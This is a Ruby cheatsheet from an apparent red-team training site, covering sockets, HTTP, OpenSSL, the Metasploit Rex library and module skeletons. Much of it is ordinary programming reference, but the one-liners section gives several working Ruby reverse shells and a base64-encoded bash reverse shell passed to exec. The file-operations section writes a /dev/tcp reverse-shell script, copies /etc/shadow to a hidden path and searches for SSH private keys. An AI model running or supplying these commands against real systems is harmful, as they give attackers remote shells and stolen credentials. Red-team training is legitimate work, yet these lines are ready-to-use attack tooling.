---
layout: training-page
title: "Ruby Red Team Cheatsheet — Red Team Academy"
module: "Programming"
tags:
  - ruby
  - cheatsheet
  - red-team
  - offensive-programming
  - metasploit
page_key: "prog-ruby-cheatsheet"
render_with_liquid: false
---

# Ruby Red Team Cheatsheet

Ruby is the language behind Metasploit Framework. Mastering Ruby lets you write custom exploits, auxiliary scanners, post-exploitation modules, and standalone offensive tools that integrate natively with the Metasploit ecosystem. This cheatsheet is a quick reference for offensive Ruby programming in 2026.

---

## 1. Environment Setup

### rbenv (recommended)

```bash
# Install rbenv and ruby-build
git clone https://github.com/rbenv/rbenv.git ~/.rbenv
git clone https://github.com/rbenv/ruby-build.git ~/.rbenv/plugins/ruby-build
echo 'export PATH="$HOME/.rbenv/bin:$PATH"' >> ~/.bashrc
echo 'eval "$(rbenv init -)"' >> ~/.bashrc
source ~/.bashrc

# Install Ruby 3.3
rbenv install 3.3.0
rbenv global 3.3.0
ruby --version
```

### rvm (alternative)

```bash
curl -sSL https://get.rvm.io | bash -s stable --ruby=3.3
source ~/.rvm/scripts/rvm
rvm use 3.3 --default
```

### Key Gems for Offensive Ruby

```bash
# Core offensive gems
gem install rex-core          # Rex socket/encoding primitives (from Metasploit)
gem install net-ssh            # SSH client
gem install net-scp            # SCP over SSH
gem install nokogiri           # Fast HTML/XML parser for web scraping
gem install httparty           # Friendly HTTP client wrapper
gem install json               # JSON (stdlib in Ruby 3+, gem for older)
gem install resolv             # DNS (stdlib)
gem install colorize           # Terminal color output
gem install trollop            # CLI option parsing (lightweight)

# Install metasploit-framework for Rex and module dev
gem install metasploit-framework
```

### Bundler for Tool Projects

```bash
# Create a new tool project
mkdir mytool && cd mytool
bundle init

# Gemfile example
cat > Gemfile <<'EOF'
source "https://rubygems.org"
ruby ">= 3.3"

gem "net-ssh", "~> 7.2"
gem "nokogiri", "~> 1.16"
gem "rex-core"
gem "colorize"
EOF

bundle install
bundle exec ruby mytool.rb
```

---

## 2. Socket Programming

### TCPSocket — Basic Client

```ruby
require 'socket'

# Connect and send/recv
sock = TCPSocket.new('192.168.1.10', 4444)
sock.puts "hello"
response = sock.recv(4096)
puts response
sock.close
```

### UDPSocket

```ruby
require 'socket'

udp = UDPSocket.new
udp.send("ping", 0, '192.168.1.1', 53)
response, sender = udp.recvfrom(512)
puts "Response from #{sender[3]}:#{sender[1]}: #{response.inspect}"
udp.close
```

### TCPServer — Simple Listener

```ruby
require 'socket'

server = TCPServer.new('0.0.0.0', 9001)
puts "Listening on 9001..."
loop do
  client = server.accept
  Thread.new(client) do |conn|
    puts "Connection from #{conn.peeraddr[3]}"
    conn.puts "Welcome"
    conn.close
  end
end
```

### Socket.tcp — Non-blocking with Timeout

```ruby
require 'socket'

begin
  Socket.tcp('10.0.0.1', 80, connect_timeout: 3) do |sock|
    sock.print "GET / HTTP/1.0\r\nHost: 10.0.0.1\r\n\r\n"
    puts sock.read
  end
rescue Errno::ECONNREFUSED
  puts "Port closed"
rescue Errno::ETIMEDOUT, IO::TimeoutError
  puts "Timed out"
end
```

### IO.select — Multiplexing Multiple Sockets

```ruby
require 'socket'

sockets = [TCPSocket.new('host1', 80), TCPSocket.new('host2', 443)]
sockets.each { |s| s.puts "GET / HTTP/1.0\r\n\r\n" }

readable, _, _ = IO.select(sockets, nil, nil, 5.0)  # 5s timeout
if readable
  readable.each do |sock|
    data = sock.recv(4096)
    puts "Data from #{sock.peeraddr[3]}: #{data[0..80]}"
  end
else
  puts "Timeout — no response"
end
sockets.each(&:close)
```

---

## 3. Net::HTTP for Web

### Basic GET and POST

```ruby
require 'net/http'
require 'uri'

uri = URI('http://target.local/login')

# GET
response = Net::HTTP.get_response(uri)
puts response.code
puts response.body[0..200]

# POST form
Net::HTTP.start(uri.host, uri.port) do |http|
  req = Net::HTTP::Post.new(uri.path)
  req.set_form_data('username' => 'admin', 'password' => 'password123')
  req['User-Agent'] = 'Mozilla/5.0'
  res = http.request(req)
  puts res.code
  puts res['Set-Cookie']
end
```

### HTTPS with Custom Verify Mode

```ruby
require 'net/http'
require 'openssl'
require 'uri'

uri = URI('https://target.local/api/v1/users')

http = Net::HTTP.new(uri.host, uri.port)
http.use_ssl = true
http.verify_mode = OpenSSL::SSL::VERIFY_NONE  # Skip cert check (red team)
# http.verify_mode = OpenSSL::SSL::VERIFY_PEER  # Prod

http.start do |h|
  req = Net::HTTP::Get.new(uri)
  req['Authorization'] = 'Bearer eyJhbGci...'
  req['Accept'] = 'application/json'
  res = h.request(req)
  puts res.body
end
```

### Cookie Handling and Redirect Following

```ruby
require 'net/http'
require 'uri'

def http_get_follow(url, cookies = {}, max_redirects = 5)
  uri = URI(url)
  response = nil

  max_redirects.times do
    Net::HTTP.start(uri.host, uri.port, use_ssl: uri.scheme == 'https',
                    verify_mode: OpenSSL::SSL::VERIFY_NONE) do |http|
      req = Net::HTTP::Get.new(uri)
      req['Cookie'] = cookies.map { |k, v| "#{k}=#{v}" }.join('; ') unless cookies.empty?
      response = http.request(req)

      # Update cookie jar
      Array(response.get_fields('set-cookie')).each do |sc|
        name, value = sc.split(';').first.split('=', 2)
        cookies[name.strip] = value.to_s.strip
      end

      if [301, 302, 303, 307, 308].include?(response.code.to_i)
        uri = URI(response['Location'])
      else
        return response, cookies
      end
    end
  end
  [response, cookies]
end

resp, jar = http_get_follow('http://target.local/')
puts resp.code
puts jar.inspect
```

### HTTP Proxy

```ruby
require 'net/http'

proxy_host = '127.0.0.1'
proxy_port = 8080

Net::HTTP.new('target.local', 80, proxy_host, proxy_port).start do |http|
  req = Net::HTTP::Get.new('/')
  res = http.request(req)
  puts res.body
end
```

---

## 4. OpenSSL Cryptography

### AES-256-CBC Encryption / Decryption

```ruby
require 'openssl'
require 'base64'

def aes_encrypt(plaintext, key)
  cipher = OpenSSL::Cipher.new('AES-256-CBC')
  cipher.encrypt
  cipher.key = key
  iv = cipher.random_iv
  ciphertext = cipher.update(plaintext) + cipher.final
  iv + ciphertext  # Prepend IV to ciphertext
end

def aes_decrypt(data, key)
  decipher = OpenSSL::Cipher.new('AES-256-CBC')
  decipher.decrypt
  decipher.key = key
  decipher.iv = data[0, 16]
  decipher.update(data[16..]) + decipher.final
end

key = OpenSSL::Digest::SHA256.digest('my_secret_passphrase')
ciphertext = aes_encrypt("whoami && id", key)
puts Base64.strict_encode64(ciphertext)
plaintext = aes_decrypt(ciphertext, key)
puts plaintext
```

### AES-256-GCM (Authenticated Encryption)

```ruby
require 'openssl'

def gcm_encrypt(plaintext, key)
  cipher = OpenSSL::Cipher.new('AES-256-GCM')
  cipher.encrypt
  cipher.key = key
  iv = cipher.random_iv
  cipher.auth_data = ""
  ciphertext = cipher.update(plaintext) + cipher.final
  tag = cipher.auth_tag
  [iv, tag, ciphertext].join
end

def gcm_decrypt(data, key)
  cipher = OpenSSL::Cipher.new('AES-256-GCM')
  cipher.decrypt
  cipher.key = key
  cipher.iv = data[0, 12]
  cipher.auth_tag = data[12, 16]
  cipher.auth_data = ""
  cipher.update(data[28..]) + cipher.final
end
```

### SHA256 and HMAC

```ruby
require 'openssl'

# SHA256 digest
hash = OpenSSL::Digest::SHA256.hexdigest("password123")
puts hash

# HMAC-SHA256
hmac = OpenSSL::HMAC.hexdigest('SHA256', 'secret_key', 'message_data')
puts hmac
```

### RSA Key Generation and Encryption

```ruby
require 'openssl'
require 'base64'

# Generate 2048-bit RSA keypair
rsa = OpenSSL::PKey::RSA.new(2048)
pub_key = rsa.public_key

# Encrypt with public key
ciphertext = pub_key.public_encrypt("secret_data", OpenSSL::PKey::RSA::PKCS1_OAEP_PADDING)
puts Base64.strict_encode64(ciphertext)

# Decrypt with private key
plaintext = rsa.private_decrypt(ciphertext, OpenSSL::PKey::RSA::PKCS1_OAEP_PADDING)
puts plaintext
```

### SecureRandom

```ruby
require 'securerandom'

key   = SecureRandom.random_bytes(32)   # 256-bit key
nonce = SecureRandom.random_bytes(12)   # 96-bit GCM nonce
token = SecureRandom.hex(16)            # 32-char hex token
uuid  = SecureRandom.uuid               # UUID v4
```

---

## 5. Rex Library (Metasploit)

Rex is Metasploit's core library. Use it standalone or inside modules.

### Rex::Socket::Tcp

```ruby
require 'rex'

sock = Rex::Socket::Tcp.create(
  'PeerHost' => '10.0.0.1',
  'PeerPort' => 8080,
  'Timeout'  => 10
)
sock.put("GET / HTTP/1.0\r\nHost: 10.0.0.1\r\n\r\n")
data = sock.get_once(-1, 5)
puts data
sock.close
```

### Rex::Proto::Http::Client

```ruby
require 'rex/proto/http/client'

cli = Rex::Proto::Http::Client.new('target.local', 80, {}, false)
cli.connect

req = cli.request_cgi({
  'method'   => 'POST',
  'uri'      => '/login',
  'vars_post' => { 'user' => 'admin', 'pass' => 'admin123' }
})

resp = cli.send_recv(req)
puts resp.code
puts resp.headers.inspect
cli.close
```

### Rex::Text Helpers

```ruby
require 'rex/text'

# Encoding helpers
Rex::Text.encode_base64("hello world")
Rex::Text.decode_base64("aGVsbG8gd29ybGQ=")
Rex::Text.to_hex("AAAA")          # => "\\x41\\x41\\x41\\x41"
Rex::Text.rand_text_alpha(16)     # Random alpha string
Rex::Text.rand_text_alphanumeric(8)
Rex::Text.pattern_create(200)     # Cyclic pattern for offset detection
Rex::Text.pattern_offset("Aa0A", 200)  # Find offset in pattern
```

### Rex Assembly / Shellcode

```ruby
require 'rex/assembly/nasm'

# Assemble x86 shellcode
asm = Rex::Assembly::Nasm.assemble("nop\nnop\nret")
puts asm.unpack1('H*')
```

---

## 6. PTY & Shell Interaction

### PTY.spawn — Interactive Shell

```ruby
require 'pty'
require 'io/console'

PTY.spawn('/bin/bash') do |pty_r, pty_w, pid|
  Thread.new { pty_r.each_char { |c| print c } }
  loop do
    line = $stdin.gets
    break if line.nil?
    pty_w.write(line)
  end
ensure
  Process.wait(pid) rescue nil
end
```

### Open3.popen3 — stdin/stdout/stderr

```ruby
require 'open3'

stdin, stdout, stderr, wait = Open3.popen3('nmap -sV 10.0.0.1')
stdin.close
output = stdout.read
errors = stderr.read
puts "STDOUT: #{output}"
puts "STDERR: #{errors}"
puts "Exit: #{wait.value.exitstatus}"
```

### Execution Methods Compared

```ruby
# system() — blocks, returns true/false, inherits stdout
system("ls -la")

# Backtick / %x{} — blocks, returns stdout as string
output = `whoami`
output = %x{id}

# exec() — replaces current process, no return
exec("bash")

# Open3.capture3 — capture all streams, non-interactive
out, err, status = Open3.capture3("ps aux")

# spawn — non-blocking, returns PID
pid = spawn("long_running_command")
Process.detach(pid)
```

---

## 7. File Operations

### Read, Write, Append

```ruby
# Read entire file
data = File.read('/etc/passwd')

# Read lines
File.readlines('/etc/hosts').each { |line| puts line.chomp }

# Write (overwrite)
File.write('/tmp/payload.sh', "#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1")

# Append
File.open('/tmp/loot.txt', 'a') { |f| f.puts "192.168.1.1:admin:password" }

# Binary write
File.binwrite('/tmp/payload.bin', "\x90" * 16 + shellcode)
```

### Tempfile

```ruby
require 'tempfile'

Tempfile.create(['payload', '.sh']) do |f|
  f.write("#!/bin/bash\nid")
  f.flush
  system("chmod +x #{f.path}")
  output = `#{f.path}`
  puts output
end
# File auto-deleted after block
```

### Dir.glob and FileUtils

```ruby
require 'fileutils'

# Find interesting files
Dir.glob('/home/**/.ssh/id_*').each { |f| puts f }
Dir.glob('/var/www/**/*.php').select { |f| File.readable?(f) }.each { |f| puts f }

# Copy files
FileUtils.cp('/etc/shadow', '/tmp/.shadow_bak')
FileUtils.mkdir_p('/tmp/.hidden/loot')
FileUtils.chmod(0o755, '/tmp/backdoor')
```

---

## 8. Concurrency

### Threads and Mutex

```ruby
require 'thread'

mutex = Mutex.new
results = []

threads = (1..10).map do |i|
  Thread.new(i) do |id|
    result = "Result #{id}"
    mutex.synchronize { results << result }
  end
end

threads.each(&:join)
puts results.sort
```

### Queue — Producer / Consumer (Thread Pool Pattern)

```ruby
require 'thread'

queue   = Queue.new
workers = []
results = Queue.new

# Producer: enqueue work
(1..100).each { |port| queue << port }
4.times { queue << :done }  # Sentinel values

# Consumers
4.times do
  workers << Thread.new do
    loop do
      item = queue.pop
      break if item == :done
      begin
        TCPSocket.new('10.0.0.1', item).close
        results << item
      rescue
      end
    end
  end
end

workers.each(&:join)
puts "Open ports: #{results.size.times.map { results.pop }.sort.join(', ')}"
```

### Fiber — Cooperative Coroutine

```ruby
producer = Fiber.new do
  ['cmd1', 'cmd2', 'cmd3'].each do |cmd|
    Fiber.yield cmd
  end
  nil
end

loop do
  cmd = producer.resume
  break if cmd.nil?
  puts "Executing: #{cmd}"
end
```

---

## 9. Metasploit Module Structure

### Auxiliary Module Skeleton

```ruby
require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Custom Banner Scanner',
      'Description' => 'Grabs banners from a custom service',
      'Author'      => ['Your Name'],
      'License'     => MSF_LICENSE
    ))
    register_options([
      Opt::RPORT(9999),
      OptString.new('PROBE', [false, 'Probe string to send', "HELLO\r\n"])
    ])
  end

  def run_host(ip)
    begin
      connect
      sock.put(datastore['PROBE'])
      banner = sock.get_once(1024, 5)
      print_good("#{ip}:#{rport} — #{banner.strip}") if banner
      report_service(host: ip, port: rport, name: 'custom', info: banner.to_s.strip)
    rescue Rex::ConnectionError => e
      print_error("#{ip}:#{rport} — #{e.message}")
    ensure
      disconnect
    end
  end
end
```

### Key Option Types

```ruby
OptString.new('USERNAME',  [true,  'Username to use', 'admin'])
OptString.new('PASSWORD',  [false, 'Password', ''])
OptPort.new('RPORT',       [true,  'Target port', 80])
OptBool.new('SSL',         [false, 'Use SSL', false])
OptAddress.new('LHOST',    [true,  'Local listener IP'])
OptInt.new('THREADS',      [false, 'Thread count', 10])
OptPath.new('WORDLIST',    [false, 'Path to wordlist file'])
OptEnum.new('METHOD',      [true,  'HTTP method', 'GET', ['GET','POST','PUT']])
```

---

## 10. One-Liners

### Reverse Shell One-Liners

```bash
# Standard Ruby reverse shell
ruby -rsocket -e 'exit if fork; s=TCPSocket.new("10.0.0.1",4444); [s,s,s].each{|fd| IO.new(fd.fileno,fd.stat.ftype=="file"?"r":"r+").sync=true}; exec "/bin/sh -i", in: s, out: s, err: s'

# Shorter version using exec with hash
ruby -rsocket -e 's=TCPSocket.new("10.0.0.1",4444);exec"/bin/sh",in: s,out: s,err: s'

# PTY-enabled reverse shell (fully interactive)
ruby -rsocket -rpty -e 'c=TCPSocket.new("10.0.0.1",4444);PTY.spawn("/bin/bash"){|r,w,p|Thread.new{c.each_byte{|b|w.putc b}};r.each_char{|b|c.print b}}'
```

### HTTP Server One-Liner

```bash
# Serve current directory on port 8000
ruby -run -e httpd . -p 8000

# With webrick explicitly
ruby -rwebrick -e 'WEBrick::HTTPServer.new(Port:8080,DocumentRoot:".").start'
```

### Base64 Decode and Execute

```bash
# Encode payload
echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' | base64 -w0

# Decode and execute
ruby -rdbase64 -e 'exec(Base64.decode64("YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjEK"))'

# Or using stdlib
ruby -e 'require "base64"; system(Base64.decode64("d2hvYW1pCg=="))'
```

### TCPSocket Echo Server One-Liner

```bash
ruby -rsocket -e 'TCPServer.new(1234).tap{|s|loop{c=s.accept;c.puts c.gets;c.close}}'
```

### DNS Lookup One-Liner

```bash
ruby -rresolv -e 'puts Resolv.getaddresses("target.com")'
```

### HTTP GET One-Liner

```bash
ruby -rnet/http -e 'puts Net::HTTP.get(URI("http://target.local/robots.txt"))'
```

---

## Resources

- [Ruby 3.3 Documentation](https://ruby-doc.org/3.3.0/)
- [Metasploit Framework Source](https://github.com/rapid7/metasploit-framework)
- [Rex Library Documentation](https://www.rubydoc.info/github/rapid7/rex-core)
- [PayloadsAllTheThings — Ruby Shells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#ruby)
- [Ruby Socket Documentation](https://ruby-doc.org/stdlib/libdoc/socket/rdoc/Socket.html)
- [OpenSSL Ruby Docs](https://ruby-doc.org/stdlib/libdoc/openssl/rdoc/OpenSSL.html)
- [net-ssh gem](https://github.com/net-ssh/net-ssh)
- [Offensive Ruby GitHub topics](https://github.com/topics/offensive-ruby)
